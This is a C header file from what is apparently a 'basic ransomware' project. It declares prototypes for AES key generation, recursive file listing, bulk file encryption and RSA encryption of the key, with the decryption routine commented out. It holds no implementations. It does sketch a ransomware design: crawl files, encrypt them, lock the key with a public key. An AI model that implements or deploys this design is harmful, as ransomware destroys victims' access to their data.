//
//
//

#ifndef BASIC_C_RANSOMWARE_FILES_H
#define BASIC_C_RANSOMWARE_FILES_H

typedef struct {
    char **paths;
    size_t count;
    size_t capacity;
} PathList;

void generateAESKeyAndIV(unsigned char *key, size_t key_size, unsigned char *iv, size_t iv_size);
void printHex(const unsigned char *data, size_t size, char *output);
void writeKeyAndIVToFile(const char *filename, const char *key, const char *iv);
void browseAndEncryptFiles(const char *path, const unsigned char *key, const unsigned char *iv, const unsigned char *aad);


unsigned char* encrypt_RSA(const char *public_key_pem, unsigned char* in, size_t inlen);
void listFiles(const char *path, PathList *pathList);
void encrypt_file(unsigned char key[32], unsigned char iv[16], unsigned char aad[], char file_path[]);
// void decryptFile(const unsigned char *key, const unsigned char *iv, const unsigned char *aad, const char *encrypted_filepath);
void initPathList(PathList *pathList);
void freePathList(PathList *pathList);

#endif //BASIC_C_RANSOMWARE_FILES_H